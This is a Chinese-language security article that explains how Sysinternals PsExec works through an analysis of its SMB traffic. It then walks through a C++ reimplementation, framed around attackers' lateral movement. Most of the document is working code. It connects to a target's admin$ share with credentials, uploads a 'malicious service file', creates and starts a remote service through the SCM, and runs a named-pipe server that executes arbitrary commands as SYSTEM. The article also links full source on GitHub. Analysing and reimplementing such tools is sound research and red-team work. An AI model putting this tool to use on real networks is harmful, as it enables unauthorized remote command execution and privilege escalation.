0x00 前言
=======

psexec是`sysinternals`提供的众多windows工具中的一个，这款工具的初衷是帮助管理员管理大量的机器的，后来被攻击者用来做横向渗透。

下载地址：

<https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>

要使用psexec，至少要满足以下要求：

1. 远程机器的 139 或 445 端口需要开启状态，即 SMB；
2. 明文密码或者 NTLM 哈希；
3. 具备将文件写入共享文件夹的权限；
4. 能够在远程机器上创建服务：SC\_MANAGER\_CREATE\_SERVICE
5. 能够启动所创建的服务：SERVICE\_QUERY\_STATUS &amp;&amp; SERVICE\_START

0x01 psexec执行原理
===============

环境：

- Windows 10 -&gt; 192.168.111.130
- Windows Server 2016 -&gt; 192.168.111.132

在windows 10上用psexec登录windows server 2016

[![vQfBE8.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e4a0857d052e028f7234ae83ed5cc0cff610e256.png)](https://imgtu.com/i/vQfBE8)

原版的psexec只支持账户密码登录，但是在impacket版的psexec支持hash登录（很实用）

psexec执行流程：

1. 将`PSEXESVC.exe`上传到`admin$`共享文件夹内；
2. 远程创建用于运行`PSEXESVC.exe`的服务；
3. 远程启动服务。

`PSEXESVC`服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件（示例中的cmd.exe），同时，它通过主机之间来重定向进程的输入/输出（利用命名管道）。

[![vQhlMn.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c1093e3e4e47e8250e847ed388a46e7269fcfc66.png)](https://imgtu.com/i/vQhlMn)

0x02 流量分析
=========

1. 使用输入的账户和密码，通过`SMB`会话进行身份验证；
2. 利用`SMB`访问默认共享文件夹`ADMIN$`，从而上传`PSEXESVC.exe`；

[![vQbE40.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-328f3cc8a6d0d476425b31b0345c786f4df3f3cc.png)](https://imgtu.com/i/vQbE40)

3. 打开`svcctl`的句柄，与服务控制器（SCM）进行通信，使得能够远程创建/启动服务。此时使用的是`SVCCTL`服务，通过对`SVCCTL`服务的`DCE\RPC`调用来启动`Psexec`；
4. 使用上传的`PSEXESVC.exe`作为服务二进制文件，调用`CreateService`函数；
5. 调用`StartService`函数；

[![vQqNiq.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9a3a2b96b7b6b4e52fe559290fbf6528cf725aaf.png)](https://imgtu.com/i/vQqNiq)

6. 之后再创建命名管道来重定向`stdin（输入）`、`stdout（输出）`、`stderr（错误输出）`。

[![vQLJXD.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-26cd88f91915c17cc82f6b71249ed601ff4b5f76.png)](https://imgtu.com/i/vQLJXD)

0x03 代码实现
=========

通过上面的分析，可以列一个代码的执行流程：

1. 连接SMB共享
2. 上传一个恶意服务文件到共享目录
3. 打开SCM创建服务
4. 启动服务 
    1. 服务创建输入输出管道
    2. 等待攻击者连接管道
    3. 从管道读取攻击者的命令
    4. 输出执行结果到管道
    5. 跳转到 3
5. 删除服务
6. 删除文件

连接SMB共享
-------

连接SMB共享需要用到`WNetAddConnection`

```php
The WNetAddConnection function enables the calling application to connect a local device to a network resource. A successful connection is persistent, meaning that the system automatically restores the connection during subsequent logon operations.
```

`WNetAddConnection`只支持16位的Windows，更高位的需要使用`WNetAddConnection2`或`WNetAddConnection3`

[WNetAddConnection2A](https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2a)

```php
DWORD WNetAddConnection2A(
  [in] LPNETRESOURCEA lpNetResource,    // 一个指向连接信息结构的指针
  [in] LPCSTR         lpPassword,       // 密码
  [in] LPCSTR         lpUserName,       // 用户名
  [in] DWORD          dwFlags           // 选项
);
```

接下来就可以实现一个连接SMB共享的函数`ConnectSMBServer`

```c++
DWORD ConnectSMBServer(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
    // SMB shared resource.
    PWCHAR lpwsIPC = new WCHAR[MAX_PATH];
    // Return value
    DWORD dwRetVal;
    // Detailed network information
    NETRESOURCE nr;
    // Connection flags
    DWORD dwFlags;

    ZeroMemory(&nr, sizeof(NETRESOURCE));
    swprintf(lpwsIPC, 100, TEXT("\\\\%s\\admin$"), lpwsHost);

    nr.dwType = RESOURCETYPE_ANY;
    nr.lpLocalName = NULL;
    nr.lpRemoteName = lpwsIPC;
    nr.lpProvider = NULL;

    dwFlags = CONNECT_UPDATE_PROFILE;

    dwRetVal = WNetAddConnection2(&nr, lpwsPassword, lpwsUserName, dwFlags);
    if (dwRetVal == NO_ERROR) {
        // success
        wprintf(L"[*] Connect added to %s\n", nr.lpRemoteName);
        return dwRetVal;
    }

    wprintf(L"[*] WNetAddConnection2 failed with error: %u\n", dwRetVal);
    return -1;
}
```

查看本地的网络连接，发现已经添加了对应的SMB共享

[![v0tSjs.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-148c57dc64cb4d90484ea42e6e77da0c825d04be.png)](https://imgtu.com/i/v0tSjs)

上传文件
----

根据Rvn0xsy师傅的博客，他利用的是CIFS协议将网络文件共享映射为本地资源去访问，从而能够直接利用Windows文件相关的API来操作共享文件。

CIFS (Common Internet File System)，Windows上的一个文件共享协议。该协议的功能包括：

1. 访问服务器本地文件并读取这些文件
2. 与其它用户一起共享一些文件块
3. 在断线时自动恢复与网络的连接
4. 使用Unicode文件名

```C++
BOOL CopyFile(
  [in] LPCTSTR lpExistingFileName,
  [in] LPCTSTR lpNewFileName,
  [in] BOOL    bFailIfExists
);
```

所以可以通过已有的SMB共享将本地文件拷贝至远程主机。

```C++
BOOL UploadFileBySMB(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath) {
    DWORD dwRetVal;
    dwRetVal = CopyFile(lpwsSrcPath, lpwsDstPath, FALSE);
    return dwRetVal > 0 ? TRUE : FALSE;
}
```

测试效果：

[![v0tJ8e.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-30b62de33c0972a3ec4d304ae088a6b28d31606e.png)](https://imgtu.com/i/v0tJ8e)

在`C:\windows\`下查看上传文件

[![v0tUKA.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9ce02842da00ae958d8b6b8e9162750877eb55b9.png)](https://imgtu.com/i/v0tUKA)

编写服务程序
------

```php
Microsoft Windows 服务（过去称为 NT 服务）允许用户创建可在其自身的 Windows 会话中长时间运行的可执行应用程序。 这些服务可在计算机启动时自动启动，可以暂停和重启，并且不显示任何用户界面。 这些功能使服务非常适合在服务器上使用，或者需要长时间运行的功能（不会影响在同一台计算机上工作的其他用户）的情况。 还可以在与登录用户或默认计算机帐户不同的特定用户帐户的安全性上下文中运行服务。
```

Windows 服务被设计用于需要在后台运行的应用程序以及实现没有用户交互的任务，并且部分服务是以SYSTEM权限启动。

服务控制管理器 (Service Control Manager, SCM)，对于服务有非常重要的作用，它可以把启动服务或停止服务的请求发送给服务。SCM是操作系统的一个组成部分，它的作用是与服务进行通信。

关于服务程序，主要包含三个部分：主函数、ServiceMain函数、处理程序。

1. 主函数：程序的一般入口，可以注册多个 ServiceMain 函数；
2. ServiceMain函数：包含服务的实际功能。服务必须为所提供的每项服务注册一个 ServiceMain 函数；
3. 处理程序：必须响应来自 SCM 的事件（停止、暂停 或 重新开始）；

Rvn0xsy师傅也给出了一个服务模板：

```C++
#include <Windows.h>
#include <stdio.h>  
// Windows 服务代码模板
////////////////////////////////////////////////////////////////////////////////////
// sc create Monitor binpath= Monitor.exe
// sc start Monitor
// sc delete Monitor
////////////////////////////////////////////////////////////////////////////////////
/**********************************************************************************/
////////////////////////////////////////////////////////////////////////////////////
// New-Service –Name Monitor –DisplayName Monitor –BinaryPathName "D:\Monitor\Monitor.exe" –StartupType Automatic
// Start-Service Monitor
// Stop-Service Monitor
////////////////////////////////////////////////////////////////////////////////////

#define SLEEP_TIME 5000                          /*间隔时间*/
#define LOGFILE "D:\\log.txt"              /*信息输出文件*/

SERVICE_STATUS ServiceStatus;  /*服务状态*/
SERVICE_STATUS_HANDLE hStatus; /*服务状态句柄*/

void  ServiceMain(int argc, char** argv);
void  CtrlHandler(DWORD request);
int   InitService();

int main(int argc, CHAR * argv[])
{
    WCHAR WserviceName[] = TEXT("Monitor");
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = WserviceName;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable);

    return 0;
}

int WriteToLog(const char* str)
{
    FILE* pfile;
    fopen_s(&pfile, LOGFILE, "a+");
    if (pfile == NULL)
    {
        return -1;
    }
    fprintf_s(pfile, "%s\n", str);
    fclose(pfile);

    return 0;
}

/*Service initialization*/
int InitService()
{
    CHAR Message[] = "Monitoring started.";
    OutputDebugString(TEXT("Monitoring started."));
    int result;
    result = WriteToLog(Message);

    return(result);
}

/*Control Handler*/
void CtrlHandler(DWORD request)
{
    switch (request)
    {
    case SERVICE_CONTROL_STOP:

        WriteToLog("Monitoring stopped.");
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;
    case SERVICE_CONTROL_SHUTDOWN:
        WriteToLog("Monitoring stopped.");

        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;
    default:
        break;
    }
    /* Report current status  */
    SetServiceStatus(hStatus, &ServiceStatus);
    return;
}

void ServiceMain(int argc, char** argv)
{
    WCHAR WserviceName[] = TEXT("Monitor");
    int error;
    ServiceStatus.dwServiceType =
        SERVICE_WIN32;
    ServiceStatus.dwCurrentState =
        SERVICE_START_PENDING;
    /*在本例中只接受系统关机和停止服务两种控制命令*/
    ServiceStatus.dwControlsAccepted =
        SERVICE_ACCEPT_SHUTDOWN |
        SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    hStatus = ::RegisterServiceCtrlHandler(
        WserviceName,
        (LPHANDLER_FUNCTION)CtrlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0)
    {

        WriteToLog("RegisterServiceCtrlHandler failed");
        return;
    }
    WriteToLog("RegisterServiceCtrlHandler success");
    /* Initialize Service   */
    error = InitService();
    if (error)
    {
        /* Initialization failed  */
        ServiceStatus.dwCurrentState =
            SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode = -1;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;
    }
    /*向SCM 报告运行状态*/
    ServiceStatus.dwCurrentState =
        SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    /*do something you want to do in this while loop*/
    // TODO
    return;
}
```

可以`TODO`部分实现自己的代码，创建并启动该服务之后就会执行该部分代码，后续与攻击者通信部分也是在这实现的。

远程管理服务
------

通过SMB共享可以上传服务文件，但是要创建服务并启动还需要通过服务控制管理器（SCM）管理。如果当前用户要连接另一台计算机上的服务，需要有相应的权限并且进行认证，但是之前连接SMB共享的时候已经通过`WNetAddConnection2`进行认证了，所以不需要再进行认证。

[OpenSCManagerA](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagera)

```php
SC_HANDLE OpenSCManagerA(
  [in, optional] LPCSTR lpMachineName,      // 目标计算机的名称
  [in, optional] LPCSTR lpDatabaseName,     // 服务控制管理器数据库的名称
  [in]           DWORD  dwDesiredAccess     // 访问权限列表
);
```

[OpenServiceA](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicea)

```php
SC_HANDLE OpenServiceA(
  [in] SC_HANDLE hSCManager,
  [in] LPCSTR    lpServiceName,
  [in] DWORD     dwDesiredAccess
);
```

[CreateServiceA](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)

```php
SC_HANDLE CreateServiceA(
  [in]            SC_HANDLE hSCManager,
  [in]            LPCSTR    lpServiceName,
  [in, optional]  LPCSTR    lpDisplayName,
  [in]            DWORD     dwDesiredAccess,
  [in]            DWORD     dwServiceType,
  [in]            DWORD     dwStartType,
  [in]            DWORD     dwErrorControl,
  [in, optional]  LPCSTR    lpBinaryPathName,
  [in, optional]  LPCSTR    lpLoadOrderGroup,
  [out, optional] LPDWORD   lpdwTagId,
  [in, optional]  LPCSTR    lpDependencies,
  [in, optional]  LPCSTR    lpServiceStartName,
  [in, optional]  LPCSTR    lpPassword
);
```

得到SCM的句柄之后，就可以利用`CreateService`创建服务，再通过调用`StartService`完成整个服务的创建、启动过程。

```C++
BOOL CreateServiceWithSCM(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)
{
    std::wcout << TEXT("Will Create Service ") << lpwsServiceName << std::endl;
    SC_HANDLE hSCM;
    SC_HANDLE hService;
    SERVICE_STATUS ss;
    // GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG
    hSCM = OpenSCManager(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        std::cout << "OpenSCManager Error: " << GetLastError() << std::endl;
        return -1;
    }

    hService = CreateService(
        hSCM, // 服务控制管理器数据库的句柄
        lpwsServiceName, // 要安装的服务的名称
        lpwsServiceName, // 用户界面程序用来标识服务的显示名称
        GENERIC_ALL, // 访问权限
        SERVICE_WIN32_OWN_PROCESS, // 与一个或多个其他服务共享一个流程的服务
        SERVICE_DEMAND_START, // 当进程调用StartService函数时，由服务控制管理器启动的服务 。
        SERVICE_ERROR_IGNORE, // 启动程序将忽略该错误并继续启动操作
        lpwsServicePath, // 服务二进制文件的标准路径
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    if (hService == NULL) {
        std::cout << "CreateService Error: " << GetLastError() << std::endl;
        return -1;
    }
    std::wcout << TEXT("Create Service Success : ") << lpwsServicePath << std::endl;
    hService = OpenService(hSCM, lpwsServiceName, GENERIC_ALL);
    if (hService == NULL) {
        std::cout << "OpenService Error: " << GetLastError() << std::endl;
        return -1;
    }
    std::cout << "OpenService Success!" << std::endl;

    StartService(hService, NULL, NULL);

    return 0;
}
```

管道通信
----

在进程间通信中，管道分为两种：匿名管道和命名管道。

**匿名管道**

匿名管道通常用于父子进程间的通信，交换数据只能在父子进程中单向流通，所以匿名管道通常会创建两个，一个用于读数据，另一个用于写数据。

<https://docs.microsoft.com/en-us/windows/win32/ipc/anonymous-pipes>

**命名管道**

命名管道比匿名管道更加灵活，可以在管道服务端和一个或多个管道客户端之间进行单向或双向通信。一个命名管道可以有多个实例，但是每个实例都有自己的缓冲区和句柄。

<https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes>

在PsExec中创建了三个命名管道`stdin、stdout、stderr` 用于攻击者和远程主机之间通信，但笔者为了偷懒，只实现了一个命名管道，输入输出都共用这个管道。

命名管道通信大致和socket通信差不多，下面是整个通信过程以及相应的Windows API：

[![vBygwF.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-2f72a9fcd9bafcdf4b0ed56c5fefb2ddd8fafc43.png)](https://imgtu.com/i/vBygwF)

### 命名管道服务端

关于如何实现命名管道幅度，笔者参考msdn提供的样例代码实现了简单的单线程服务端。

参考代码：

<https://docs.microsoft.com/en-us/windows/win32/ipc/multithreaded-pipe-server>

先创建一个命名管道

```C++
int _tmain(VOID) {
    HANDLE hStdoutPipe = INVALID_HANDLE_VALUE;
    LPCTSTR lpszStdoutPipeName = TEXT("\\\\.\\pipe\\PSEXEC");

    if (!CreateStdNamedPipe(&hStdoutPipe, lpszStdoutPipeName)) {
        OutputError(TEXT("CreateStdNamedPipe PSEXEC"), GetLastError());
    }
    _tprintf("[*] CreateNamedPipe successfully!\n");
}

BOOL CreateStdNamedPipe(PHANDLE lpPipe, LPCTSTR lpPipeName) {
    *lpPipe = CreateNamedPipe(
        lpPipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE |
        PIPE_READMODE_MESSAGE |
        PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        BUFSIZE,
        BUFSIZE,
        0,
        NULL);

    return !(*lpPipe == INVALID_HANDLE_VALUE);
}
```

之后再等待客户端进行连接

```C++
if (!ConnectNamedPipe(hStdoutPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED)) {
        OutputError("ConnectNamePipe PSEXEC", GetLastError());

        CloseHandle(hStdoutPipe);
        return -1;
}
_tprintf("[*] ConnectNamedPipe sucessfully!\n");
```

客户端连接之后，进入循环一直读取从客户端发来的命令，然后创建子进程执行命令，再通过匿名管道读取执行结果，将结果写入命名管道从而让客户端读取。

```C++
while (true) {
        DWORD cbBytesRead = 0;

        ZeroMemory(pReadBuffer, sizeof(TCHAR) * BUFSIZE);
        // Read message from client.
        if (!ReadFile(hStdoutPipe, pReadBuffer, BUFSIZE, &cbBytesRead, NULL)) {
            OutputError("[!] ReadFile from client failed!\n", GetLastError());
            return -1;
        }
        _tprintf("[*] ReadFile from client successfully. message = %s\n", pReadBuffer);

        /*================= subprocess ================*/
        sprintf_s(lpCommandLine, BUFSIZE, "cmd.exe /c \"%s && exit\"", pReadBuffer);
        _tprintf("[*] Command line %s\n", lpCommandLine);

        if (!CreateProcess(
            NULL,
            lpCommandLine,
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            OutputError("CreateProcess", GetLastError());
            return -1;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        fSuccess = SetNamedPipeHandleState(
            hWritePipe,    // pipe handle 
            &dwMode,  // new pipe mode 
            NULL,     // don't set maximum bytes 
            NULL);    // don't set maximum time 

        ZeroMemory(pWriteBuffer, sizeof(TCHAR) * BUFSIZE);
        fSuccess = ReadFile(hReadPipe, pWriteBuffer, BUFSIZE * sizeof(TCHAR), &cbBytesRead, NULL);

        if (!fSuccess && GetLastError() != ERROR_MORE_DATA) {
            break;
        }

        // Send result to client.
        cbToWritten = (lstrlen(pWriteBuffer) + 1) * sizeof(TCHAR);
        if (!WriteFile(hStdoutPipe, pWriteBuffer, cbBytesRead, &cbToWritten, NULL)) {
            OutputError("WriteFile", GetLastError());
            return -1;
        }
        _tprintf("[*] WriteFile to client successfully!\n");
}
```

### 命名管道客户端

命名管道客户端同样参考msdn提供的代码：

<https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipe-client>

客户端需要先通过`CreateFile`连接到命名管道，然后调用`WaitNamedPipe`等待管道实例是否可用

```C++
HANDLE hStdoutPipe = INVALID_HANDLE_VALUE;
LPCTSTR lpszStdoutPipeName = TEXT("\\\\.\\pipe\\PSEXEC");

hStdoutPipe = CreateFile(
        lpszStdoutPipeName,
        GENERIC_READ |
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

// All pipe instances are busy, so wait for 20 seconds.
if (WaitNamedPipe(lpszStdoutPipeName, 20000)) {
    _tprintf(TEXT("[!] Could not open pipe (PSEXEC): 20 second wait timed out.\n"));
    return -1;
}
_tprintf(TEXT("[*] WaitNamedPipe successfully!\n"));
```

连接命名管道后，同样进入循环交互，将从终端读取的命令写入管道中，等待服务端执行完毕后再从管道中读取执行结果。

```C++
while (true) {
        std::string command;

        std::cout << "\nPsExec>";
        getline(std::cin, command);
        cbToRead = command.length() * sizeof(TCHAR);

        if (!WriteFile(hStdoutPipe, (LPCVOID)command.c_str(), cbToRead, &cbRead, NULL)) {
            _tprintf(TEXT("[!] WriteFile to server error! GLE = %d\n"), GetLastError());
            break;
        }
        _tprintf(TEXT("[*] WriteFile to server successfully!\n"));

        fSuccess = ReadFile(hStdoutPipe, chBuf, BUFSIZE * sizeof(TCHAR), &cbRead, NULL);
        if (!fSuccess) {
            /*OutputError(TEXT("ReadFile"), GetLastError());*/
            _tprintf("ReadFile error. GLE = %d", GetLastError());
        }

        std::cout << chBuf << std::endl;
}
```

测试命名管道执行效果：

[![vB4uo6.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3815adcac2d13ef80f062fb80422e98dc2a3da84.png)](https://imgtu.com/i/vB4uo6)

[![vB4Gyd.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a44c1c528ef7a8f953140e6d5b1d663917cc9dbf.png)](https://imgtu.com/i/vB4Gyd)

0x04 最终效果
=========

[![vBLVyT.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c04d80bfeadb866bf354d459127cba252a1de676.png)](https://imgtu.com/i/vBLVyT)

这里的权限为`nt authority\system`，这是因为系统服务一般是由`system`来启动，所以命名管道可以通过模拟客户端来窃取token从而将administrator提升至system，`metasploit`当中的`getsystem`原理就是这个。

[![vBLnw4.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-af7a2d19600dc6206ca2ca469986efe61b8df248.png)](https://imgtu.com/i/vBLnw4)

全部源代码已经放在Github上

<https://github.com/zesiar0/MyPsExec>

0x05 参考链接
=========

1. <https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/>
2. <https://payloads.online/archivers/2020-04-02/1/>
3. <https://docs.microsoft.com/en-us/windows/win32/ipc/using-pipes>